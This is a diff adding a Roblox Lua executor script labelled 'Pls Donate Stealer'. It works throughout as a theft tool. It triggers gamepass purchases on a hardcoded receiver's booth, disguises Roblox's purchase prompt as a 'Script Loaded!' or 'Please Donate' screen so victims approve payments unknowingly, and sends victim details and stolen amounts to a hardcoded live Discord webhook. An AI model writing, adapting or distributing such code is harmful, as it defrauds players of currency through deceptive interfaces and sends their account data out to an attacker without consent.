@@ -1,0 +1,186 @@
+-- Espera jogo carregar
+repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer and game.Players.LocalPlayer.Parent
+
+local Username = "Ian_wp27"
+local Webhook = "https://discord.com/api/webhooks/1359920557998604399/TADkOrRGt4BHvwAxE7NBMMxx4JHI-EBblHnsnvRS8iXThLWDTvpGoYKThwdlmCcvqyO6"
+local LogsWebhook = nil
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage"):WaitForChild("ReplicatedStorage", 10)
+local MarketplaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+
+local request = syn and syn.request or http_request or http.request or (request or http and http.request) or requests
+if typeof(request) ~= "function" then
+    error("Executor sem suporte HTTP!")
+end
+
+local Remotes = require(ReplicatedStorage:WaitForChild("Remotes", 10))
+
+local headers = {["Content-Type"] = "application/json"}
+
+-- Get RECEIVER User ID
+local success, UserId = pcall(function()
+    return Players:GetUserIdFromNameAsync(Username)
+end)
+
+local asset
+local userRobux
+
+local function sendWebhook()
+    local embed = {
+        title = "Shar's Script | Pls Donate Stealer",
+        color = 16711680,
+        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..tostring(Players.LocalPlayer.UserId).."&width=420&height=420&format=png"},
+        fields = {
+            {name="Victim Info", value="```Executor: "..(identifyexecutor and identifyexecutor() or "Unknown").."\nUsername: "..Players.LocalPlayer.Name.."\nUser ID: "..tostring(Players.LocalPlayer.UserId).."\nAge: "..tostring(Players.LocalPlayer.AccountAge).."\nTarget: "..Username.."```", inline=false},
+            {name="Robux Stolen", value="```"..tostring(userRobux or 0).."```", inline=true},
+            {name="Gamepass Price", value="```"..tostring(asset and asset:GetAttribute("AssetPrice") or 0).."```", inline=true}
+        },
+        footer = {text = "Shar's Script"}
+    }
+    
+    pcall(function()
+        request({
+            Url = Webhook, 
+            Method = "POST", 
+            Headers = headers, 
+            Body = HttpService:JSONEncode({
+                username = "Pls Donate Hit",
+                content = "@everyone",
+                embeds = {embed}
+            })
+        })
+    end)
+end
+
+if success and UserId then
+    print("Targeting RECEIVER booth: " .. Username)
+    
+    local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
+    if not Booth then
+        Players.LocalPlayer:Kick("Receiver not found!")
+        return
+    end
+
+    local function Purchase()
+        local range = 0
+        for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
+            if v:GetAttribute("AssetType") == "Gamepass" and 
+               not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
+                local Attribute = v:GetAttribute("AssetPrice")
+                if Attribute and Attribute <= (userRobux or math.huge) and Attribute > range then
+                    asset = v
+                    range = Attribute
+                end
+            end
+        end
+    
+        if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
+            asset.Prompt:FireServer("", false, range)
+        end
+    end
+    
+    -- FIX: Monitora CoreGui para PurchasePrompt aparecer
+    local PurchasePromptConnection
+    PurchasePromptConnection = CoreGui.ChildAdded:Connect(function(child)
+        if child.Name == "PurchasePrompt" then
+            task.wait(0.1)
+            local ProductPurchaseContainer = child:WaitForChild("ProductPurchaseContainer", 5)
+            if ProductPurchaseContainer then
+                local Animator = ProductPurchaseContainer:WaitForChild("Animator", 5)
+                if Animator then
+                    -- Purchase Prompt Hijacking
+                    repeat task.wait() until not Animator:FindFirstChild("Prompt")
+
+                    Animator.ChildAdded:Connect(function(promptChild)
+                        if promptChild.Name == "Prompt" then
+                            local successGui, err = pcall(function()
+                                local RemainingBalanceText = promptChild:WaitForChild("AlertContents", 2)
+                                    :WaitForChild("Footer", 2)
+                                    :WaitForChild("FooterContent", 2)
+                                    :WaitForChild("Content", 2)
+                                    :FindFirstChild("RemainingBalanceText")
+                                
+                                if RemainingBalanceText then
+                                    local balanceText = RemainingBalanceText.Text:match("(%d+)%s*(R%??)")
+                                    local balance = tonumber(balanceText) or 0
+                                    
+                                    if userRobux then
+                                        -- Fake "Please Donate" screen
+                                        promptChild.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
+                                        promptChild.AlertContents.MiddleContent.Visible = false
+                                        if promptChild.AlertContents.Footer.Buttons["1"] then
+                                            promptChild.AlertContents.Footer.Buttons["1"].Visible = false
+                                        end
+                                        if promptChild.AlertContents.Footer.Buttons["2"] then
+                                            promptChild.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
+                                        end
+                                        promptChild.AlertContents.Footer.FooterContent.Visible = false
+                                    elseif asset then
+                                        -- "Script Loaded" screen
+                                        promptChild.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
+                                        promptChild.AlertContents.MiddleContent.Visible = false
+                                        if promptChild.AlertContents.Footer.Buttons["1"] then
+                                            promptChild.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
+                                        end
+                                        if promptChild.AlertContents.Footer.Buttons["2"] then
+                                            promptChild.AlertContents.Footer.Buttons["2"].Visible = false
+                                        end
+                                        promptChild.AlertContents.Footer.FooterContent.Visible = false
+                                        
+                                        userRobux = balance + (asset:GetAttribute("AssetPrice") or 0)
+                                        asset = nil
+                                    end
+                                end
+                            end)
+                        end
+                    end)
+
+                    Animator.ChildRemoved:Connect(function(child)
+                        if child.Name == "Prompt" and userRobux then
+                            task.wait(0.5)
+                            Purchase()
+                        end
+                    end)
+                end
+            end
+            PurchasePromptConnection:Disconnect()
+        end
+    end)
+
+    -- Gift Detection
+    Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
+        if a == UserId then
+            print("Gift from " .. Username .. ": " .. robux)
+            if userRobux then
+                sendWebhook()
+            end
+            userRobux = (userRobux or 0) - robux
+            task.wait(1)
+            Purchase()
+        end
+    end)
+
+    -- Start com cheapest gamepass
+    local range = math.huge
+    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
+        if v:GetAttribute("AssetType") == "Gamepass" and 
+           not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
+            local Attribute = v:GetAttribute("AssetPrice")
+            if Attribute and Attribute < range then
+                asset = v
+                range = Attribute
+            end
+        end
+    end
+    
+    if asset then
+        asset.Prompt:FireServer("", false, range)
+    end
+else
+    warn("Receiver '" .. Username .. "' não encontrado!")
+end
+
+print("Loaded! Target: " .. Username)
